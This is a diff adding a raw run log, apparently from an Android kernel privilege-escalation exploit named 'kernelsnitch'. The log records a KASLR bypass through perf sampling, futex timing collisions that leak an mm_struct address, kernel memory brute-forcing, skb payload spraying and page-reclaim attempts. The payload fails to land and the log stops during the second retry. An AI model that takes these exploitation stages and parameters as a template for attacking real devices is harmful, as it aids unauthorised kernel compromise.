@@ -1,0 +1,1534 @@
+[b24e39de8 23:24:04] [32m[+][t13553] [0mpreload starting pid=13553
+[b24e39de8 23:24:04] [32m[+][t13553] [0mlayout static measured=0 pvo=0000000000000000 la0=ffffff8000000000 p0=ffffff8000000000 vmemmap=[fffffffeffe00000-ffffffff3fe00000] window=[ffffff8000000000-ffffffe000000000] kaslr=pending0000000000000000
+[b24e39de8 23:24:04] [31m[-][t13553] [0mlayout measurement failed; static target fallback in effect (override via KS_LAYOUT_PVO / KS_LAYOUT_VM / KSNITCH_IDENTITY_START / KSNITCH_IDENTITY_END)
+[b24e39de8 23:24:04] [32m[+][t13553] [0mstartup context pid=13553 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[b24e39de8 23:24:04] [32m[+][t13553] [0mstartup limits pid=13553 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[b24e39de8 23:24:04] [32m[+][t13553] [0mbuild config pid=13553 label=pfum10c48_no_btf slide=pselect main=pselect
+[b24e39de8 23:24:04] [32m[+][t13553] [0mp0 profile pid=13553 phys_offset=0000000080000000 kernel_phys_load=00000000a0080000 delta=0000000020080000 slide_logger=ffffff8022b2acf0 bootid_data=ffffff8022a64ab8 init_task=ffffff8022bef580 root_tg=ffffff8022ea9e70 sysctl_bootid=ffffff80231b13e9
+[b24e39de8 23:24:04] [33m[*][t13553] [0mperf round=0 samples=973 round_min=ffffffd36ac81cbc slot=ffffffd36ac00000 hits=1 min=ffffffd36ac81cbc
+[b24e39de8 23:24:04] [33m[*][t13553] [0mperf round=1 samples=805 round_min=ffffffd36ac81cbc slot=ffffffd36ac00000 hits=2 min=ffffffd36ac81cbc
+[b24e39de8 23:24:04] [32m[+][t13553] [0mperf text-base pid=13553 samples=1778 min_kip=ffffffd36ac81cbc slot_off=0000000000081cbc text_base=ffffffd36ac80000
+[b24e39de8 23:24:04] [32m[+][t13553] [0mtext-base-ok pid=13553 text=ffffffd36ac80000 slide=000000135ac00000 (perf)
+[b24e39de8 23:24:04] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:24:06] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:24:06] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff8000000000-ffffffe000000000] mte disabled
+[b24e39de8 23:24:07] [33m[*][t14899] [0mapprox_time=7 thr=70
+[b24e39de8 23:24:07] [33m[*][t14899] [0mstart finding collisisons
+[b24e39de8 23:24:07] [33m[*][t14899] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:24:07] [33m[*][t14899] [0mtarget_time=134 thr=70
+[b24e39de8 23:24:09] [33m[*][t14899] [0m  00000069881f9b68 i=3437 t=17758/14206/13197
+[b24e39de8 23:24:12] [33m[*][t14899] [0m  000000698953f598 i=8371 t=17769/14317/17730
+[b24e39de8 23:24:12] [33m[*][t14899] [0m  000000698969d088 i=8721 t=17756/17766/14889
+[b24e39de8 23:24:13] [33m[*][t14899] [0m  00000069897f9b68 i=9069 t=17627/17722/17708
+[b24e39de8 23:24:14] [33m[*][t14899] [0m  000000698a27bf78 i=11759 t=17607/14295/17698
+[b24e39de8 23:24:14] [33m[*][t14899] [0mfound 5 collisisons
+[b24e39de8 23:24:15] [33m[*][t14899] [0mpost-pile baseline=21 target=21 count=5
+[b24e39de8 23:24:15] [33m[*][t14899] [0mpost-pile[1] 00000069881f9b68 t=20
+[b24e39de8 23:24:15] [33m[*][t14899] [0mpost-pile[2] 000000698953f598 t=21
+[b24e39de8 23:24:15] [33m[*][t14899] [0mpost-pile[3] 000000698969d088 t=21
+[b24e39de8 23:24:15] [33m[*][t14899] [0mpost-pile[4] 00000069897f9b68 t=21
+[b24e39de8 23:24:15] [33m[*][t14899] [0mpost-pile[5] 000000698a27bf78 t=21
+[b24e39de8 23:24:15] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:24:15] [33m[*][t19073] [0m[  1] start finding mm_struct [ffffff8c00000000-ffffff9800000000]
+[b24e39de8 23:24:15] [33m[*][t19072] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8c00000000]
+[b24e39de8 23:24:15] [33m[*][t19074] [0m[  2] start finding mm_struct [ffffff9800000000-ffffffa400000000]
+[b24e39de8 23:24:15] [33m[*][t19077] [0m[  5] start finding mm_struct [ffffffbc00000000-ffffffc800000000]
+[b24e39de8 23:24:15] [33m[*][t19079] [0m[  7] start finding mm_struct [ffffffd400000000-ffffffe000000000]
+[b24e39de8 23:24:15] [33m[*][t19076] [0m[  4] start finding mm_struct [ffffffb000000000-ffffffbc00000000]
+[b24e39de8 23:24:15] [33m[*][t19075] [0m[  3] start finding mm_struct [ffffffa400000000-ffffffb000000000]
+[b24e39de8 23:24:15] [33m[*][t19078] [0m[  6] start finding mm_struct [ffffffc800000000-ffffffd400000000]
+[b24e39de8 23:24:19] [33m[*][t19073] [0mfound mm_struct ffffff91e2d68000
+[b24e39de8 23:24:19] [33m[*][t19073] [0m[  1] scan done coarse=ffffff9200000000 end=ffffff9800000000 found=1
+[b24e39de8 23:24:19] [33m[*][t19079] [0m[  7] scan done coarse=ffffffda00000000 end=ffffffe000000000 found=1
+[b24e39de8 23:24:19] [33m[*][t19077] [0m[  5] scan done coarse=ffffffc200000000 end=ffffffc800000000 found=1
+[b24e39de8 23:24:19] [33m[*][t19076] [0m[  4] scan done coarse=ffffffb600000000 end=ffffffbc00000000 found=1
+[b24e39de8 23:24:19] [33m[*][t19074] [0m[  2] scan done coarse=ffffff9e00000000 end=ffffffa400000000 found=1
+[b24e39de8 23:24:19] [33m[*][t19078] [0m[  6] scan done coarse=ffffffce00000000 end=ffffffd400000000 found=1
+[b24e39de8 23:24:19] [33m[*][t19075] [0m[  3] scan done coarse=ffffffaa00000000 end=ffffffb000000000 found=1
+[b24e39de8 23:24:19] [33m[*][t19072] [0m[  0] scan done coarse=ffffff8600000000 end=ffffff8c00000000 found=1
+[b24e39de8 23:24:19] [33m[*][t13553] [0mlayout infer-from-leak base=ffffff91e2d68000 la0=ffffff9140000000 p0=ffffff91c0000000 vmemmap=[fffffffeffe00000-ffffffff3fe00000]
+[b24e39de8 23:24:19] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff91e2d68000 phys_probe=0xffffff91e2bd1d38 delta=1663688 (0.0GB)
+[b24e39de8 23:24:19] [33m[*][t13553] [0mprepare_skb_payload base=ffffff91e2d68000 delta=0 payload_base=ffffff91e2d68000
+[b24e39de8 23:24:19] [33m[*][t13553] [0mskbdelta wrote pb=ffffff91e2d68000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:24:19] [33m[*][t13553] [0mpayload nonce 264f3ff2308697f9 at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:24:19] [33m[*][t13553] [0mdone
+[b24e39de8 23:24:19] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:24:19] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:24:19] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:19] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:19] [33m[*][t13553] [0mfix40 mm_page_free tracepoint id=240
+[b24e39de8 23:24:19] [33m[*][t13553] [0mfix40 free-arm n=14 est_pfn=666984 k=[0,13]
+[b24e39de8 23:24:20] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:24:20] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:24:20] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:24:20] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:24:21] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:24:21] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:24:21] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:24:21] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:24:21] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:24:21] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:21] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:24:21] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:24:21] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:22] [33m[*][t13553] [0mfix36 mm_page_alloc tracepoint id=242
+[b24e39de8 23:24:22] [33m[*][t13553] [0mfix36 tp arm n=14 ctrl=1 est_pfn=666984 k=[0,13] k_fixed=-1
+[b24e39de8 23:24:22] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:24:22] [33m[*][t13553] [0mfix36 phase1 tp ctrl=529 ord3=502 best=0 best_pfn=0 best3=0 best3_pfn=0 n=14
+[b24e39de8 23:24:22] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:24:22] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:24:22] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:24:22] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:24:23] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:24:23] [33m[*][t13553] [0mfix40 free HIT pfn=929128 k=1 hits=1
+[b24e39de8 23:24:23] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:24:23] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:24:23] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff91e2d69100 errno=22
+[b24e39de8 23:24:23] [31m[-][t13553] [0mwatchpoint open open addr=ffffff91e2d69070 errno=22
+[b24e39de8 23:24:23] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff91e2d6ff00 errno=22
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:24:23] [33m[*][t19123] [0mfix36 tp arm n=14 ctrl=1 est_pfn=666984 k=[0,13] k_fixed=-1
+[b24e39de8 23:24:23] [33m[*][t19123] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:24:23] [33m[*][t19123] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:24:23] [33m[*][t19123] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:24:23] [33m[*][t19123] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:24:23] [33m[*][t19123] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:24:23] [33m[*][t19123] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:24:23] [33m[*][t19123] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:24:23] [33m[*][t19123] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:24:23] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=898
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:24:23] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:24:23] [33m[*][t13553] [0mfix36 phase2 tp ctrl=905 ord3=898 best=0 best_pfn=0 best3=0 best3_pfn=0 n=14
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff91e2d6a238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:24:23] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 38[b24e39de8 23:24:23] [33m[*][t13553] [0m 2f[b24e39de8 23:24:23] [33m[*][t13553] [0m de[b24e39de8 23:24:23] [33m[*][t13553] [0m 6a[b24e39de8 23:24:23] [33m[*][t13553] [0m d3[b24e39de8 23:24:23] [33m[*][t13553] [0m ff[b24e39de8 23:24:23] [33m[*][t13553] [0m ff[b24e39de8 23:24:23] [33m[*][t13553] [0m ff[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m 00[b24e39de8 23:24:23] [33m[*][t13553] [0m
+[b24e39de8 23:24:23] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:24:23] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
+[b24e39de8 23:24:23] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:24:23] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:24:23] [33m[*][t13553] [0mpayload nonce want=264f3ff2308697f9 got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:24:23] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff91e2d69070 len=8 fill=0 pos=7883678008957363548 page=92978c30b3602b14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:24:23] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff91e2d69070 len=8 fill=0 pos=7883678008957363548 page=92978c30b3602b14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:24:23] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff91e2d69070 len=8 fill=0 pos=7883678008957363548 page=92978c30b3602b14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:24:23] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff91e2d69100 len=8 fill=0 pos=7883678008957363548 page=92978c30b3602ba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:24:23] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff91e2d69100 len=8 fill=0 pos=7883678008957363548 page=92978c30b3602ba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:24:23] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff91e2d69100 len=8 fill=0 pos=7883678008957363548 page=92978c30b3602ba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:24:23] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:24:23] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:24:23] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:24:23] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:24:23] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff91e2d68000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:24:23] [31m[-][t13553] [0mprepare_kernel_page retry 1/72
+[b24e39de8 23:24:24] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:24:26] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:24:26] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:24:26] [33m[*][t20462] [0mapprox_time=6 thr=60
+[b24e39de8 23:24:26] [33m[*][t20462] [0mstart finding collisisons
+[b24e39de8 23:24:26] [33m[*][t20462] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:24:26] [33m[*][t20462] [0mtarget_time=131 thr=60
+[b24e39de8 23:24:30] [33m[*][t20462] [0m  00000069891f3b38 i=7527 t=17614/14248/17568
+[b24e39de8 23:24:31] [33m[*][t20462] [0m  00000069894a00a0 i=8212 t=17602/14550/17619
+[b24e39de8 23:24:34] [33m[*][t20462] [0m  000000698b03cd80 i=15280 t=17611/17429/17573
+[b24e39de8 23:24:35] [33m[*][t20462] [0m  000000698b3bf998 i=16179 t=17493/17608/14181
+[b24e39de8 23:24:38] [33m[*][t20462] [0m  000000698cb16450 i=22154 t=17577/17472/17582
+[b24e39de8 23:24:38] [33m[*][t20462] [0mfound 5 collisisons
+[b24e39de8 23:24:39] [33m[*][t20462] [0mpost-pile baseline=21 target=25 count=5
+[b24e39de8 23:24:39] [33m[*][t20462] [0mpost-pile[1] 00000069891f3b38 t=25
+[b24e39de8 23:24:39] [33m[*][t20462] [0mpost-pile[2] 00000069894a00a0 t=25
+[b24e39de8 23:24:39] [33m[*][t20462] [0mpost-pile[3] 000000698b03cd80 t=13
+[b24e39de8 23:24:39] [33m[*][t20462] [0mpost-pile[4] 000000698b3bf998 t=13
+[b24e39de8 23:24:39] [33m[*][t20462] [0mpost-pile[5] 000000698cb16450 t=13
+[b24e39de8 23:24:39] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:24:39] [33m[*][t24653] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:24:39] [33m[*][t24654] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:24:39] [33m[*][t24660] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:24:39] [33m[*][t24658] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:24:39] [33m[*][t24655] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:24:39] [33m[*][t24656] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:24:39] [33m[*][t24659] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:24:39] [33m[*][t24657] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:24:39] [33m[*][t24653] [0m[  0] scan done coarse=ffffff9240000000 end=ffffff9240000000 found=0
+[b24e39de8 23:24:39] [33m[*][t24657] [0m[  4] scan done coarse=ffffff9400000000 end=ffffff9400000000 found=0
+[b24e39de8 23:24:39] [33m[*][t24659] [0m[  6] scan done coarse=ffffff9500000000 end=ffffff9500000000 found=0
+[b24e39de8 23:24:39] [33m[*][t24658] [0mfound mm_struct ffffff943d9becc0
+[b24e39de8 23:24:39] [33m[*][t24660] [0m[  7] scan done coarse=ffffff9540000000 end=ffffff9540000000 found=0
+[b24e39de8 23:24:39] [33m[*][t24656] [0m[  3] scan done coarse=ffffff9380000000 end=ffffff9380000000 found=1
+[b24e39de8 23:24:39] [33m[*][t24658] [0m[  5] scan done coarse=ffffff9440000000 end=ffffff9480000000 found=1
+[b24e39de8 23:24:39] [33m[*][t24654] [0m[  1] scan done coarse=ffffff92c0000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:24:39] [33m[*][t24655] [0m[  2] scan done coarse=ffffff9300000000 end=ffffff9340000000 found=1
+[b24e39de8 23:24:39] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff943d9b8000 phys_probe=0xffffff91e2bd1d38 delta=10114458312 (9.4GB)
+[b24e39de8 23:24:39] [33m[*][t13553] [0mprepare_skb_payload base=ffffff943d9b8000 delta=0 payload_base=ffffff943d9b8000
+[b24e39de8 23:24:39] [33m[*][t13553] [0mskbdelta wrote pb=ffffff943d9b8000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:24:39] [33m[*][t13553] [0mpayload nonce 2115930f308697ed at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:24:39] [33m[*][t13553] [0mdone
+[b24e39de8 23:24:39] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:24:39] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:24:39] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:39] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:39] [33m[*][t13553] [0mfix40 free-arm n=7 est_pfn=3135928 k=[-2,4]
+[b24e39de8 23:24:39] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:24:40] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:24:40] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:24:40] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:24:40] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:24:40] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:24:41] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:24:41] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:24:41] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:24:41] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:41] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:24:41] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:24:41] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:41] [33m[*][t13553] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3135928 k=[-2,4] k_fixed=-1
+[b24e39de8 23:24:41] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:24:41] [33m[*][t13553] [0mfix36 phase1 tp ctrl=523 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:24:41] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:24:41] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:24:42] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:24:42] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:24:42] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:24:42] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:24:42] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:24:42] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:24:42] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:24:42] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:24:42] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:24:42] [33m[*][t13553] [0mfix40 free HIT pfn=3398072 k=1 hits=1
+[b24e39de8 23:24:42] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:24:42] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:24:42] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff943d9b9100 errno=22
+[b24e39de8 23:24:42] [31m[-][t13553] [0mwatchpoint open open addr=ffffff943d9b9070 errno=22
+[b24e39de8 23:24:42] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff943d9bff00 errno=22
+[b24e39de8 23:24:42] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:24:42] [33m[*][t24680] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3135928 k=[-2,4] k_fixed=-1
+[b24e39de8 23:24:42] [33m[*][t24680] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:24:43] [33m[*][t24680] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:24:43] [33m[*][t24680] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:24:43] [33m[*][t24680] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:24:43] [33m[*][t24680] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:24:43] [33m[*][t24680] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:24:43] [33m[*][t24680] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:24:43] [33m[*][t24680] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:24:43] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=897
+[b24e39de8 23:24:43] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:24:43] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:24:43] [33m[*][t13553] [0mfix36 phase2 tp ctrl=903 ord3=897 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:24:43] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff943d9ba238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:24:43] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:24:43] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 38[b24e39de8 23:24:43] [33m[*][t13553] [0m 2f[b24e39de8 23:24:43] [33m[*][t13553] [0m de[b24e39de8 23:24:43] [33m[*][t13553] [0m 6a[b24e39de8 23:24:43] [33m[*][t13553] [0m d3[b24e39de8 23:24:43] [33m[*][t13553] [0m ff[b24e39de8 23:24:43] [33m[*][t13553] [0m ff[b24e39de8 23:24:43] [33m[*][t13553] [0m ff[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m 00[b24e39de8 23:24:43] [33m[*][t13553] [0m
+[b24e39de8 23:24:43] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:24:43] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
